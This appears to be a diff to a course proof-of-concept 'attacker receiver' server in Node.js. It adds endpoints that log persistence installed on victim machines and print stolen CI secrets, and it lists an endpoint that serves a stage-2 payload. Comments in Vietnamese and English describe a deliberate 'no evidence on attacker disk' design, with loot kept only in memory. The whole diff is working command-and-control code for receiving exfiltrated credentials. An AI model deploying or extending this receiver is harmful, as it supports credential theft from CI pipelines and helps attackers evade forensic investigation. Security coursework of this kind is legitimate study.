@@ -203,6 +203,48 @@ req.end();
     return;
   }
 
+  // ── POST /exfil/persist ──────────────────────────────────────────────────
+  // Nhận thông báo persistence đã được cài trên victim
+  if (req.method === "POST" && req.url === "/exfil/persist") {
+    let payload;
+    try { payload = JSON.parse(body); } catch { res.writeHead(400).end(); return; }
+
+    console.log("\n" + "▓".repeat(60));
+    console.log(`[${timestamp()}] ◄◄ PERSISTENCE INSTALLED on ${clientIP}`);
+    console.log("─".repeat(60));
+    console.log(`  host     : ${payload.hostname}`);
+    console.log(`  user     : ${payload.username}`);
+    console.log(`  platform : ${payload.platform}`);
+    console.log(`  method   : ${payload.persistence?.method}`);
+    console.log(`  task     : ${payload.persistence?.task || payload.persistence?.interval}`);
+    console.log("  [!] Beacon will ping back every 5 minutes — even after reboot.");
+    console.log("▓".repeat(60));
+
+    // Persistence event: log in-memory only, không ghi disk (no evidence)
+    res.writeHead(200).end("ok");
+    return;
+  }
+
+  // ── POST /exfil/stream ───────────────────────────────────────────────────
+  // Stream-only exfil: log secrets ra console, KHÔNG ghi file loot
+  // Demo "no evidence on attacker disk" — mọi data chỉ tồn tại trong RAM
+  if (req.method === "POST" && req.url === "/exfil/stream") {
+    let payload;
+    try { payload = JSON.parse(body); } catch { res.writeHead(400).end(); return; }
+
+    console.log("\n" + "░".repeat(60));
+    console.log(`[${timestamp()}] ◄◄ STREAM EXFIL (no-disk) from ${clientIP}`);
+    console.log("─".repeat(60));
+    console.log(`  host : ${payload.context?.hostname}  user: ${payload.context?.username}`);
+    console.log("  [secrets — in-memory only, NOT saved to disk]");
+    printSecrets(payload.secrets || {});
+    console.log("░".repeat(60));
+
+    // Không gọi saveLoot() — data chỉ in ra stdout rồi mất
+    res.writeHead(200).end("ok");
+    return;
+  }
+
   // ── Unknown ──────────────────────────────────────────────────────────────
   res.writeHead(404).end();
 });
@@ -210,9 +252,12 @@ req.end();
 server.listen(PORT, "0.0.0.0", () => {
   console.log("═".repeat(60));
   console.log(`[NT230 PoC] Attacker receiver listening on port ${PORT}`);
-  console.log(`  POST /exfil/secrets                  — CI secret harvest`);
+  console.log(`  POST /exfil/secrets                  — CI secret harvest (lưu disk)`);
+  console.log(`  POST /exfil/stream                   — stream-only (KHÔNG lưu disk)`);
+  console.log(`  POST /exfil/persist                  — persistence confirm (no disk)`);
   console.log(`  POST /exfil/artifact-poison-confirm  — artifact poison confirm`);
   console.log(`  GET  /beacon                         — second-stage consumer beacon`);
-  console.log(`  Loot saved to: ${LOOT_DIR}`);
+  console.log(`  GET  /stage2                         — serve stage-2 payload`);
+  console.log(`  Loot dir: ${LOOT_DIR}`);
   console.log("═".repeat(60));
 });
